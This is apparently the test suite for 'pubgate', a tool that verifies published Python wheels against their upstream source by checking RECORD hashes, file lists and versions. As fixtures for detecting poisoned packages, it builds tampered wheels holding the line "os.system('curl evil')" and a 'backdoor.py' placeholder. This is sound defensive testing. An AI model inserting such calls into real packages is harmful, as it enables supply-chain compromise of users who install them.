"""pubgate test suite — stdlib unittest only (no pytest on this host).

Covers the single assertion the tool exists to make:
    published artifact == build(upstream source)
"""

import json
import os
import subprocess
import sys
import tempfile
import unittest
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(os.path.dirname(HERE), "src")
if SRC not in sys.path:
    sys.path.insert(0, SRC)

from pubgate.engine import (  # noqa: E402
    MANIFEST_SCHEMA,
    PubgateError,
    exit_code,
    iau_digest,
    load_manifest,
    record_digest,
    record_hashes,
    sha256_bytes,
    source_manifest,
    verify_record,
    verify_source,
)


def _sha(data):
    return sha256_bytes(data)


def make_wheel(path, files, pkg="demo", version="1.0.0", record_override=None):
    """Build a minimal but structurally real wheel (zip) on disk.

    RECORD digests are written exactly as PEP 427 specifies (urlsafe base64, unpadded) —
    a hex-only fixture made an earlier digest-normalisation bug invisible.
    """
    dist_info = "{}-{}.dist-info".format(pkg, version)
    record_rows = []
    with zipfile.ZipFile(path, "w") as zf:
        for member, data in files.items():
            zf.writestr(member, data)
            record_rows.append("{},sha256={},{}".format(member, record_digest(data), len(data)))
        row = "{}/RECORD,,".format(dist_info)
        record_rows.append(row)
        if record_override is not None:
            record_rows = record_override
        record = "\n".join(record_rows) + "\n"
        zf.writestr("{}/RECORD".format(dist_info), record)
        zf.writestr(
            "{}/METADATA".format(dist_info),
            "Metadata-Version: 2.1\nName: {}\nVersion: {}\n".format(pkg, version),
        )
        zf.writestr("{}/WHEEL".format(dist_info), "Wheel-Version: 1.0\n")
        # NOTE: RECORD itself is written before being listed correctly on purpose of realism;
        # verify_record exempts RECORD from self-hashing.
    return path


def make_source(root, files):
    for rel, data in files.items():
        full = os.path.join(root, rel)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "w", encoding="utf-8") as fh:
            fh.write(data)
    return root


class TestHashing(unittest.TestCase):
    def test_sha256_bytes_known_vector(self):
        self.assertEqual(
            _sha(b"abc"),
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
        )

    def test_iau_digest_is_order_independent(self):
        a = {"b.py": "1", "a.py": "2"}
        b = {"a.py": "2", "b.py": "1"}
        self.assertEqual(iau_digest(a), iau_digest(b))
        self.assertNotEqual(iau_digest(a), iau_digest({"a.py": "1", "b.py": "2"}))


class TestSourceManifest(unittest.TestCase):
    def test_manifest_records_files_and_ignores_junk(self):
        with tempfile.TemporaryDirectory() as td:
            make_source(td, {"src/demo/__init__.py": "X = 1\n",
                             "src/demo/core.py": "def f():\n    return 2\n",
                             "__pycache__/demo.cpython-311.pyc": "junk",
                             ".git/HEAD": "ref\n"})
            m = source_manifest(td)
            self.assertEqual(m["schema"], MANIFEST_SCHEMA)
            self.assertIn("src/demo/__init__.py", m["files"])
            self.assertNotIn("__pycache__/demo.cpython-311.pyc", m["files"])
            self.assertNotIn(".git/HEAD", m["files"])
            self.assertEqual(m["digest"], iau_digest(m["files"]))

    def test_manifest_is_deterministic(self):
        with tempfile.TemporaryDirectory() as td:
            make_source(td, {"a.py": "a\n", "b.py": "b\n"})
            self.assertEqual(source_manifest(td)["digest"], source_manifest(td)["digest"])

    def test_manifest_detects_content_change(self):
        with tempfile.TemporaryDirectory() as td:
            make_source(td, {"a.py": "a\n"})
            before = source_manifest(td)["digest"]
            make_source(td, {"a.py": "a \n"})   # one byte
            self.assertNotEqual(before, source_manifest(td)["digest"])


class TestRecordIntegrity(unittest.TestCase):
    def test_clean_wheel_has_no_violations(self):
        with tempfile.TemporaryDirectory() as td:
            w = make_wheel(os.path.join(td, "demo-1.0.0-py3-none-any.whl"),
                           {"demo/__init__.py": b"X = 1\n"})
            self.assertEqual(verify_record(w), [])
            self.assertEqual(record_hashes(w)["demo/__init__.py"], _sha(b"X = 1\n"))

    def test_tampered_member_is_detected(self):
        """The LiteLLM shape: artifact bytes diverge from their recorded digest."""
        with tempfile.TemporaryDirectory() as td:
            src = make_wheel(os.path.join(td, "good.whl"), {"demo/__init__.py": b"X = 1\n"})
            bad = os.path.join(td, "bad.whl")
            with zipfile.ZipFile(src) as zin, zipfile.ZipFile(bad, "w") as zout:
                for item in zin.infolist():
                    data = zin.read(item.filename)
                    if item.filename == "demo/__init__.py":
                        data = b"import os; os.system('curl evil')\n"
                    zout.writestr(item, data)
            kinds = [v.kind for v in verify_record(bad)]
            self.assertIn("RECORD_MISMATCH", kinds)

    def test_unlisted_member_is_detected(self):
        with tempfile.TemporaryDirectory() as td:
            w = make_wheel(os.path.join(td, "demo-1.0.0-py3-none-any.whl"),
                           {"demo/__init__.py": b"X = 1\n"})
            with zipfile.ZipFile(w, "a") as zf:
                zf.writestr("demo/backdoor.py", b"evil\n")
            kinds = [v.kind for v in verify_record(w)]
            self.assertIn("RECORD_UNLISTED", kinds)


class TestSourceCorrespondence(unittest.TestCase):
    def _pair(self, td, wheel_files, src_files, version="1.0.0"):
        w = make_wheel(os.path.join(td, "demo-{}.whl".format(version)), wheel_files, version=version)
        s = make_source(os.path.join(td, "srcroot"), src_files)
        m = source_manifest(s)
        m["name"] = "demo"
        m["version"] = version
        return w, m

    def test_matching_artifact_and_source_pass(self):
        with tempfile.TemporaryDirectory() as td:
            w, m = self._pair(td, {"demo/core.py": b"def f():\n    return 2\n"},
                              {"src/demo/core.py": "def f():\n    return 2\n"})
            self.assertEqual(verify_source(w, m), [])
            self.assertEqual(exit_code(verify_source(w, m)), 0)

    def test_poisoned_artifact_fails_against_clean_source(self):
        """Upstream source clean, published wheel not — the failure this tool exists for."""
        with tempfile.TemporaryDirectory() as td:
            w, m = self._pair(td, {"demo/core.py": b"import os; os.system('curl evil')\n"},
                              {"src/demo/core.py": "def f():\n    return 2\n"})
            kinds = [v.kind for v in verify_source(w, m)]
            self.assertIn("SOURCE_MISMATCH", kinds)
            self.assertEqual(exit_code(verify_source(w, m)), 1)

    def test_source_file_missing_from_artifact_is_detected(self):
        with tempfile.TemporaryDirectory() as td:
            w, m = self._pair(td, {"demo/core.py": b"def f():\n    return 2\n"},
                              {"src/demo/core.py": "def f():\n    return 2\n",
                               "src/demo/extra.py": "SECRET = 1\n"})
            kinds = [v.kind for v in verify_source(w, m)]
            self.assertIn("SOURCE_ABSENT", kinds)

    def test_version_mismatch_is_detected(self):
        with tempfile.TemporaryDirectory() as td:
            w, m = self._pair(td, {"demo/core.py": b"x = 1\n"}, {"src/demo/core.py": "x = 1\n"})
            m["version"] = "9.9.9"
            kinds = [v.kind for v in verify_source(w, m)]
            self.assertIn("VERSION_MISMATCH", kinds)


class TestErrorPaths(unittest.TestCase):
    """Fail closed: unusable input must raise, never silently pass."""

    def test_non_zip_is_rejected(self):
        with tempfile.TemporaryDirectory() as td:
            p = os.path.join(td, "fake.whl")
            with open(p, "wb") as fh:
                fh.write(b"not a zip at all")
            with self.assertRaises(PubgateError):
                verify_record(p)

    def test_missing_source_dir_is_rejected(self):
        with self.assertRaises(PubgateError):
            source_manifest("/nonexistent/definitely/not/here")

    def test_bad_manifest_schema_is_rejected(self):
        with tempfile.TemporaryDirectory() as td:
            p = os.path.join(td, "m.json")
            with open(p, "w", encoding="utf-8") as fh:
                json.dump({"schema": "other.v9", "files": {}}, fh)
            with self.assertRaises(PubgateError):
                load_manifest(p)

    def test_record_listing_absent_member_is_detected(self):
        with tempfile.TemporaryDirectory() as td:
            rows = ["demo/ghost.py,sha256={},3".format(_sha(b"abc")), "demo-1.0.0.dist-info/RECORD,,"]
            w = make_wheel(os.path.join(td, "demo-1.0.0-py3-none-any.whl"),
                           {"demo/__init__.py": b"X = 1\n"}, record_override=rows)
            kinds = [v.kind for v in verify_record(w)]
            self.assertIn("RECORD_MISSING", kinds)


class TestCli(unittest.TestCase):
    def _run(self, *args):
        env = dict(os.environ)
        env["PYTHONPATH"] = SRC
        return subprocess.run(
            [sys.executable, "-m", "pubgate"] + list(args),
            capture_output=True, text=True, env=env,
        )

    def test_record_then_verify_passes_and_exits_zero(self):
        with tempfile.TemporaryDirectory() as td:
            s = make_source(os.path.join(td, "srcroot"), {"src/demo/core.py": "x = 1\n"})
            man = os.path.join(td, "manifest.json")
            r = self._run("record", "--source", s, "--name", "demo",
                          "--version", "1.0.0", "--out", man)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertTrue(os.path.exists(man))
            with open(man) as fh:
                self.assertEqual(json.load(fh)["schema"], MANIFEST_SCHEMA)
            w = make_wheel(os.path.join(td, "demo-1.0.0-py3-none-any.whl"),
                           {"demo/core.py": b"x = 1\n"})
            r2 = self._run("verify", "--wheel", w, "--manifest", man)
            self.assertEqual(r2.returncode, 0, r2.stdout + r2.stderr)
            self.assertIn("PASS", r2.stdout)

    def test_verify_fails_closed_on_missing_manifest(self):
        with tempfile.TemporaryDirectory() as td:
            w = make_wheel(os.path.join(td, "demo-1.0.0-py3-none-any.whl"), {"demo/core.py": b"x = 1\n"})
            r = self._run("verify", "--wheel", w, "--manifest", os.path.join(td, "nope.json"))
            self.assertEqual(r.returncode, 2)
            self.assertIn("FAIL", r.stdout + r.stderr)


if __name__ == "__main__":
    unittest.main(verbosity=2)
